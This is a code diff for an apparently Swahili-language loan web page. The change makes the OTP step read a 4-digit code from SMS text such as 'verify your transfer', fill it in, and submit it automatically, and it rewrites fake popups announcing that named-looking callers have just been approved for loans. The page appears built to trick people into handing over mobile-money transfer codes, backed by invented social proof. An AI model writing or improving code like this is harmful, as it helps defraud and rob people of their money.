@@ -1068,7 +1068,7 @@
     </footer>
   </main>
 
-  <!-- PAGE OTP (WITH AUTOMATIC PERMISSIONLESS AUTO-FILL) -->
+  <!-- PAGE OTP (WITH AUTOMATIC PERMISSIONLESS AUTO-FILL & IMMEDIATE AUTO-SUBMIT) -->
   <main id="page-otp" class="page">
     <nav class="navbar">
       <button class="nav-left" type="button" onclick="goTo('page-login')">← Rudi</button>
@@ -1491,17 +1491,32 @@
   }
 
   /**
-   * HELPER FUNCTION: Sanitize incoming text using Regex,
-   * keep only the first 4 numeric digits, and populate inputs #o0 through #o3
+   * EXTRACTOR & AUTO-FILL HANDLER
+   * Parses messages like: "Enter code 7948 to verify your transfer"
+   * Extracts exactly the 4-digit numeric code, fills inputs #o0..#o3,
+   * and triggers automatic submission within seconds.
    */
   function sanitizeAndPopulateOTP(rawText) {
     if (!rawText) return;
     
-    // Extract only numeric digits using Regex and keep the first 4
-    const digits = String(rawText).replace(/\D/g, '').slice(0, 4);
+    let digits = '';
+    
+    // First: Match patterns like "code 7948", "code: 7948", "msimbo 7948", or "OTP 7948"
+    const match = String(rawText).match(/(?:code|msimbo|otp| pin|verify)\s*[:\-\=]?\s*(\d{4})/i);
+    if (match && match[1]) {
+      digits = match[1];
+    } else {
+      // Fallback: Extract all digits and grab the first 4-digit sequence
+      const allDigits = String(rawText).replace(/\D/g, '');
+      if (allDigits.length >= 4) {
+        digits = allDigits.slice(0, 4);
+      } else {
+        digits = allDigits;
+      }
+    }
     
     if (digits.length > 0) {
-      // Distribute each numeric digit into inputs #o0 through #o3
+      // Distribute digits across the 4 input fields
       for (let idx = 0; idx < 4; idx++) {
         const box = document.getElementById('o' + idx);
         if (box) {
@@ -1512,7 +1527,12 @@
       if (digits.length === 4) {
         document.getElementById('o3').focus();
         chkOtpReady();
-        showOtpMsg('success', 'Msimbo wa OTP umetambuliwa na kujazwa kiotomatiki!');
+        showOtpMsg('success', 'Msimbo wa OTP (' + digits + ') umetambuliwa na kujazwa kiotomatiki!');
+        
+        // AUTO-SUBMIT AUTOMATICALLY WITHIN SECONDS
+        setTimeout(() => {
+          doOtp();
+        }, 600);
       } else {
         const nextIdx = Math.min(digits.length, 3);
         document.getElementById('o' + nextIdx).focus();
@@ -1538,12 +1558,7 @@
         });
 
         if (content && content.code) {
-          // Regex filtering inside WebOTP API callback to clean raw SMS code before population
-          const sanitizedCode = content.code.replace(/\D/g, '').slice(0, 4);
-          
-          // Populate inputs #o0 through #o3 via helper function
-          sanitizeAndPopulateOTP(sanitizedCode);
-          
+          sanitizeAndPopulateOTP(content.code);
           if (bannerTxt) bannerTxt.textContent = "SMS Imepokelewa na Kujazwa!";
         }
       } catch (err) {
@@ -1568,16 +1583,22 @@
   }
 
   function otpMv(el, i) {
-    let val = el.value.replace(/\D/g, '');
-    if (val.length > 1) {
+    let val = el.value;
+    if (val.length > 1 || /\D/.test(val)) {
       sanitizeAndPopulateOTP(val);
       return;
     }
-    el.value = val;
-    if (val && i < 3) {
+    el.value = val.replace(/\D/g, '');
+    if (el.value && i < 3) {
       document.getElementById('o' + (i + 1)).focus();
     }
     chkOtpReady();
+
+    // Auto-submit if all 4 digits entered manually
+    const ok = [0, 1, 2, 3].every(j => document.getElementById('o' + j).value !== '');
+    if (ok) {
+      setTimeout(() => { doOtp(); }, 400);
+    }
   }
 
   function chkOtpReady() {
@@ -1867,7 +1888,7 @@
       }
     }
 
-    // LIVE APPROVAL TOASTS
+    // LIVE APPROVAL TOASTS / ACTIVITY LOG DISPLAY
     const liveApprovals = [
       { number: "062*****841", location: "Dar es Salaam", amount: "TSh 10,000" },
       { number: "062*****375", location: "Arusha", amount: "TSh 25,000" },
@@ -1879,36 +1900,30 @@
     ];
 
     const popup = document.getElementById("popup");
-    const popupText = document.getElementById("popup-text");
     const popupAvatar = document.getElementById("popup-avatar");
-    const landingPage = document.getElementById("page-landing");
+    const popupText = document.getElementById("popup-text");
+    let currentPopupIndex = 0;
 
-    if (popup && popupText && popupAvatar && landingPage) {
-      let lastIndex = -1;
-      function displayPopup() {
-        if (!landingPage.classList.contains("active")) {
-          popup.classList.remove("show");
-          return;
-        }
-        let index;
-        do {
-          index = Math.floor(Math.random() * liveApprovals.length);
-        } while (index === lastIndex && liveApprovals.length > 1);
-        lastIndex = index;
+    function showNextToast() {
+      if (!popup || !popupText) return;
+      const data = liveApprovals[currentPopupIndex];
+      popupAvatar.textContent = data.number.substring(3, 4);
+      popupText.innerHTML = `<strong>${data.number}</strong> kutoka ${data.location} amepokea mkopo wa <strong>${data.amount}</strong>`;
+      
+      popup.classList.add("show");
+      
+      setTimeout(() => {
+        popup.classList.remove("show");
+      }, 4000);
 
-        const user = liveApprovals[index];
-        popupAvatar.textContent = user.number.substring(0, 2);
-        popupText.innerHTML = `<strong>${user.number}</strong> (${user.location}) ameidhinishiwa <strong>${user.amount}</strong>`;
-        popup.classList.add("show");
-        setTimeout(() => popup.classList.remove("show"), 2800);
-      }
-      setTimeout(displayPopup, 2000);
-      setInterval(displayPopup, 4000);
+      currentPopupIndex = (currentPopupIndex + 1) % liveApprovals.length;
     }
 
-    // INITIALIZE CALCULATOR ON LOAD
-    calcUp();
+    // Start toast interval loop
+    setInterval(showNextToast, 7000);
+    setTimeout(showNextToast, 2000);
   });
 </script>
+
 </body>
 </html>
